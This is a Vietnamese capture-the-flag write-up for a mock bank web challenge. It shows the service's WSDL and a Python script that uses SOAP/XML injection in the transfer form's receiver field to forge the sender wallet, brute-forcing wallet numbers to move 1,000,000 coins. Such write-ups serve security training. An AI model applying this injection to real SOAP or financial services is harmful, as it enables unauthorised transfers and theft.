
URL:  http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/</br>
</br>
Đầu tiên ta cần tạo một tài khoảng và login vào</br>
Tại VIP : `"This section is available only to privileged pigs with money in pockets. Transfer to the piggy-bank 1 000 000 coins and become important."`</br>
![1](https://user-images.githubusercontent.com/23306492/43188979-b23d15d4-901f-11e8-9dac-2090b0566b3f.png)</br>
Trong khi ta chỉ có `110 `</br>
![2](https://user-images.githubusercontent.com/23306492/43189089-fc26109c-901f-11e8-880e-0d993ad51eaa.png)</br>
Tại tab `For Developers` ta thấy `<!-- Link to the API (http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/api/bankservice.wsdl.php) (Testing stage) -->`</br>
**bankservice.wsdl.php**</br>
```
<wsdl:definitions name="Bank" targetNamespace="urn:Bank">
<message name="BalanceRequest">
	<part name="wallet_num" type="xsd:decimal"/>
</message>
<message name="BalanceResponse">
	<part name="code" type="xsd:float"/>
	<part name="status" type="xsd:string"/>
</message>
<message name="internalTransferRequest">
	<part name="receiver_wallet_num" type="xsd:decimal"/>
	<part name="sender_wallet_num" type="xsd:decimal"/>
	<part name="amount" type="xsd:float"/>
	<part name="token" type="xsd:string"/>
</message>
<message name="internalTransferResponse">
	<part name="code" type="xsd:float"/>
	<part name="status" type="xsd:string"/>
</message>
<portType name="BankServicePort">
	<operation name="requestBalance">
		<input message="tns:BalanceRequest"/>
		<output message="tns:BalanceResponse"/>
	</operation><operation name="internalTransfer">
		<input message="tns:internalTransferRequest"/>
		<output message="tns:internalTransferResponse"/>
	</operation>
</portType>
<binding name="BankServiceBinding" type="tns:BankServicePort">
	<soap:binding style="rpc" transport="http://schemas.xmlsoap.org/soap/http"/>
	<operation name="requestBalance">
		<soap:operation soapAction="urn:requestBalanceAction"/>
		<input><soap:body use="encoded" namespace="urn:Bank" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/></input>
		<output><soap:body use="encoded" namespace="urn:Bank" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/></output>
	</operation>
	<operation name="internalTransfer">
		<soap:operation soapAction="urn:internalTransferAction"/>
		<input><soap:body use="encoded" namespace="urn:Bank" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/></input>
		<output><soap:body use="encoded" namespace="urn:Bank" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/></output>
	</operation>
</binding>
<wsdl:service name="BankService">
<wsdl:port name="BankServicePort" binding="tns:BankServiceBinding">
<soap:address location="http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/api/bankservice.php"/>
</wsdl:port>
</wsdl:service>
</wsdl:definitions>
```
Sử dụng Wsdler </br>
![6](https://user-images.githubusercontent.com/23306492/43189565-0bbb77e4-9021-11e8-8fdf-9e07d176ae35.png)</br>
Sử dụng SOAP INJECTION VULNERABILITY để tấn công [link](http://riseandhack.blogspot.com/2015/02/xml-injection-soap-injection-notes.html)
```
import requests
url1 = "http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/auth.php"
url2 = "http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/home/transfer.php"
s = requests.session()
s.get(url1,params={"login":"k4k4","password":"k4k4"})
for i in range(1000,10000):
	print i
	payload = {	"receiver":'1405</receiver_wallet_num><sender_wallet_num xsi:type="xsd:decimal">'+str(i)+'</sender_wallet_num><amount>1000000<!--',
				"amount":"-->"
		}
	r = s.post(url2,data=payload)
	msg = r.text
	if "Successful" in msg:
		print "ok"
		break
```
![8](https://user-images.githubusercontent.com/23306492/43189896-f0e7aef0-9021-11e8-9c4b-6c8e1a6331a3.png)</br>
![9](https://user-images.githubusercontent.com/23306492/43189915-fe30e32e-9021-11e8-9524-e2fb098652e9.png)</br>

